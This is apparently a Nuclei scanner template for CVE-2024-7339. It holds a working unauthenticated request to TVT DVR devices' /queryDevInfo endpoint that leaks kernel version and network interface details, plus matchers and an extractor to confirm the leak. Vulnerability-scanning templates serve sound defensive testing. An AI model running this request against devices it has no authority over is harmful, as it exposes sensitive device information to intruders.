id: CVE-2024-7339

info:
  name: Information Disclosure in TVT DVR
  author: kaks3c
  severity: high
  reference:
    - https://netsecfish.notion.site/Sensitive-Device-Information-Disclosure-in-TVT-DVR-fad1cce703d946969be5130bf3aaac0d

http:
  - raw:
    - |
      POST /queryDevInfo HTTP/1.1
      Host: {{Hostname}}
      Accept-Language: en-US,en;q=0.9
      Accept-Encoding: gzip, deflate
      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
      Upgrade-Insecure-Requests: 1
      Connection: keep-alive
      User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS like Mac OS X) AppleWebKit (KHTML, like Gecko) Version Mobile Safari
      Content-Length: 103
      Content-Type: application/xml

      <?xml version="1.0" encoding="utf-8" ?><request version="1.0" systemType="NVMS-9000" clientType="WEB"/>

    matchers:
      - type: xpath
        xpath:
          - "//kenerlVersion"
          - "//eth0"
        condition: and

    extractors:
      - type: xpath
        name: eth0
        xpath:
          - "//eth0"
        group: 0
